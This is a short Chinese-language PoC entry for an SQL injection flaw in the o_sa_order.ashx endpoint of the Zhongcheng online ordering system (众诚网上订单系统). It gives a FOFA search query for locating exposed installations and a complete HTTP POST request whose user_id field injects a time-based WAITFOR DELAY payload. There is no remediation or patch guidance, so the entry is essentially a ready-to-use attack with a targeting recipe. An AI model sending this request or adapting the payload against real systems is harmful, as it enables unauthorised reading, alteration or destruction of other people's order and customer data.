# 众诚网上订单系统o_sa_order.ashx存在SQL注入漏洞

众诚网上订单系统o_sa_order.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```yaml
title="众诚网上订单系统"
```

## poc

```javascript
POST /ajax/o_sa_order.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Priority: u=0
 
type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:5%27--&user_pwd=1
```

